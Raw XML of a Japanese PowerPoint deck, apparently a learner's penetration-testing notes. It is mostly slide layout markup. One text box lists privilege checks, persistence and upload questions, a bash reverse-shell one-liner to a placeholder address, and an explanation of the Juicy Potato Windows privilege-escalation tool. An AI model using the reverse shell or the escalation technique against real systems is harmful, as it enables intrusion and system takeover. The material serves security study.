                  <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>・</a:t>
                </a:r>
                <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:endParaRPr>
              </a:p>
              <a:p>
                <a:r>
                  <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>・</a:t>
                </a:r>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="55" name="グループ化 54">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B356C850-D500-4B6F-934E-FDA708D157EE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1632607" y="4654253"/>
            <a:ext cx="4784299" cy="646541"/>
            <a:chOff x="2491467" y="2402584"/>
            <a:chExt cx="7943847" cy="646541"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="56" name="四角形: 角を丸くする 55">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5F0DDF8C-470C-4F67-A05B-07709E02BA74}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2491467" y="2402584"/>
              <a:ext cx="7780901" cy="646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p>
          </p:txBody>
        </p:sp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="57" name="グループ化 56">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{53168D32-9AF4-4E83-B7AC-00B85A44622D}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="2671764" y="2520750"/>
              <a:ext cx="7763550" cy="528375"/>
              <a:chOff x="2671764" y="2520750"/>
              <a:chExt cx="7763550" cy="528375"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="58" name="四角形: 角を丸くする 57">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{83F25E00-5139-4C54-B93F-4B5B0FB25CEC}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="2671764" y="2520750"/>
                <a:ext cx="1967592" cy="44428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400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="tx1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>Delivery</a:t>
                </a:r>
                <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="59" name="テキスト ボックス 58">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{912BF64E-8F53-40E3-8F37-3D9EA8F9AA1D}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr txBox="1"/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="4776109" y="2525905"/>
                <a:ext cx="5659205" cy="523220"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
            </p:spPr>
            <p:txBody>
              <a:bodyPr wrap="square" rtlCol="0">
                <a:spAutoFit/>
              </a:bodyPr>
              <a:lstStyle/>
              <a:p>
                <a:r>
                  <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>・</a:t>
                </a:r>
                <a:br>
                  <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                </a:br>
                <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="65" name="矢印: 右 64">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{86F81642-675B-4299-A96C-D8B010E3E0E8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="16704173">
            <a:off x="4216420" y="360894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2" name="矢印: 右 31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D1E9C788-B005-410E-9DA0-6944AC95C6C3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="3895386" y="3632590"/>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6" name="矢印: 右 65">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3CC54F5E-B2B0-45FF-B502-5E70B6111BDD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="8972627" y="3592358"/>
            <a:ext cx="4258399" cy="273904"/>
          </a:xfrm>
          <a:prstGeom prst="right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665767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6D0CDEE6-6A23-4C2E-9E77-69919630CE22}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="284480" y="895150"/>
            <a:ext cx="13351027" cy="5355312"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>Whoami</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t> /</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>priv</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>　権限の確認コマンド</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>Qiita.com/nozomi2025/items/51ec1b574facd5cf89ca </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>　このページの流れで実行したい→ちゃんと理解</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>juicy potato</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>についてちゃんと調べて理解</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>web</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>サイトに</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>upload file</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>の項目があるかどうか？なかった場合はどうするか？</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>ポートは本当にあいてるか？</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>永続化の方法は本当にそれだけか、それが通らなかったら？</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>シェルリスナーの設置は</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>windows</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>に対して有効か？</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>Windows</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>への</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>nc</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>のダウンロードはどうするか？</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>Php</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>　→　</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>file upload</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>がある場合</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>Bash –c ‘bash –I &gt;&amp; /dev/</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>tcp</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>ipaddress</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>/port 0&gt;&amp;1’</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>Juicy potato</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>windows</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>のローカル特権昇格ツール、</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>COM</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>サービスとトークン偽装の仕組みを悪用して</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>SYSTEM</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>権限を奪取</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>COM</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>「</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>Componet</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t> Object Model</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>」（オブジェクト指向のソフトウェアコンポーネントモデル）</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>Shell.Application</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>や</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0" err="1"/>
              <a:t>Wscript.Shell</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>等</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>異なるプログラミング言語や環境で作成された部品通しを共通のプロトコルでつなぐための仕組み（</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>C#</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>とか</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>VB</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>とか</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>Python</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>とか）</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>DCOM</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>（上記の</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>COM</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>をネットワーク越しでも使えるようにした拡張機能）</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1838113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3F8BB86-87C9-46C8-9F87-81ADCB025A06}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="コンテンツ プレースホルダー 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BD67C64B-CEF8-4B04-B3EA-C786EB54A949}"/>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818260089"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/theme/theme1.xml><?xml version="1.0" encoding="utf-8"?>
<a:theme xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" name="Office Theme">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1272</TotalTime>
  <Words>709</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>ワイド画面</PresentationFormat>
  <Paragraphs>110</Paragraphs>
  <Slides>5</Slides>
  <Notes>2</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5</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="11" baseType="lpstr">
      <vt:lpstr>游ゴシック</vt:lpstr>
      <vt:lpstr>游ゴシック Light</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Calibri Light</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A1259089</dc:creator>
  <cp:lastModifiedBy>A1259089</cp:lastModifiedBy>
  <cp:revision>63</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-04-01T03:52:14Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-04-06T02:39:24Z</dcterms:modified>
</cp:coreProperties>
</file>